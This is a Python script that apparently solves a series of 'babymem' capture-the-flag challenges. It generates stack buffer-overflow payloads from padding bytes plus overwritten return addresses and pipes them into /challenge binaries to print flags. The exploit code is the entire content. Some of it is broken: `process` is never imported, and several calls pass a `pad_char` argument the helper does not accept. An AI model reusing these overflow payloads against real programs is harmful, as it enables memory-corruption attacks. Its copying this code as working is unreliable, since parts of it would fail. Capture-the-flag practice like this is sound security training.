#!/usr/bin/env python

def str_in_stack(data_str):
    encoded_string = data_str.encode('utf-8')
    padded_string = encoded_string.ljust(8, b'\x00')
    hex_number = int.from_bytes(padded_string, 'little')
    return hex(hex_number)

def hex2fmt_str(hex_number):
    byte_length = (hex_number.bit_length() + 7) // 8  # Calculate the number of bytes needed
    byte_string = hex_number.to_bytes(byte_length, byteorder='little')  # Convert to bytes in little-endian order
    formatted_string = ''.join(['\\x{:02x}'.format(byte) for byte in byte_string])
    return formatted_string

def fast_payload_gen(pre_len, value, challenge):
    fmt_str = hex2fmt_str(value)
    val_len = len(fmt_str) // 4
    command = 'printf "' + str(pre_len + val_len) + '\\n'
    for i in range(0, pre_len):
        command = command + 'a'
    print(command + fmt_str + '" | /challenge/' + challenge)

def babymem_2_0():
    p = process('/challenge/babymem_level2.0')
    p.readuntil('Payload size: ')
    p.sendline(b'64')
    input_byte = b''
    for i in range(60):
        input_byte = input_byte + b'a'
    input_byte = input_byte + b'\xf0\x25\x29\x12'
    p.readuntil('Send your payload')
    p.readline()
    p.sendline(input_byte)
    p.readuntil('flag:\n')
    print(p.readline())

def babymem_2_1():
    fast_payload_gen(72, 0x3be21a84, 'babymem_level2.1')

def babymem_3_0():
    fast_payload_gen(136, 0x402265, 'babymem_level3.0')

def babymem_3_1():
    fast_payload_gen(104, 0x401464, 'babymem_level3.1')

def babymem_6_0():
    fast_payload_gen(72, 0x40203a, 'babymem_level6.0')

def babymem_6_1():
    fast_payload_gen(88, 0x401d3a, 'babymem_level6.1')

def babymem_7_0():
    fast_payload_gen(56, 0x1718, 'babymem_level7.0')

def babymem_7_1():
    fast_payload_gen(120, 0x586c, 'babymem_level7.1')

def babymem_8_0():
    fast_payload_gen(72, 0x17dc, 'babymem_level8.0', pad_char = '\x00')

def babymem_8_1():
    fast_payload_gen(152, 0x1825, 'babymem_level8.1', pad_char = '\x00')

def babymem_10_0():
    fast_payload_gen(113, 0x0, 'babymem_level10.0')

def babymem_10_1():
    fast_payload_gen(0x2c, 0x0, 'babymem_level10.1')
